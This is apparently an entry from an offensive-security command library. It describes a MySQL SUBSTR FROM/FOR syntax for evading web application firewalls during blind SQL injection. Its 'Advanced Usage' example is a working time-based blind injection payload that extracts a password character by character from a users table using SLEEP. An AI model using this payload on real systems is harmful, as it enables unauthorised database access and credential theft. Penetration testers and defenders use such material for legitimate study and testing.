---
type: command
executor: sql
data: SUBSTR('SQL' FROM 1 FOR 1)
tags:
  - sql-injection
  - waf-bypass
platforms:
  - Web
verified: true
validated: true
---

# sql-substr-from-for-bypass

## Command

```sql
SUBSTR('SQL' FROM 1 FOR 1)
```

## Description

MySQL substring extraction using FROM and FOR clauses to bypass WAFs that filter comma-separated SUBSTR calls (e.g., SUBSTR('SQL',1,1)). Ideal for blind SQLi where character-by-character data extraction is needed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'SQL' | Input string to extract from | Yes |
| FROM 1 | Starting position (1-based index) | Yes |
| FOR 1 | Length of substring to extract | Yes |

## Examples

### Basic Usage

```sql
SELECT SUBSTR('SQL' FROM 1 FOR 1);
```

### Advanced Usage

```sql
SELECT IF(SUBSTR((SELECT password FROM users LIMIT 1) FROM 1 FOR 1)='a', SLEEP(5), 0);
```

## Expected Output

Returns the extracted substring, e.g., 'S' for the first character. Success: Function evaluates correctly in conditional logic without WAF block.

## Related

- [[procedures/SQL-Injection-WAF-Bypass-with-OFFSET-FROM-and-JOIN]]
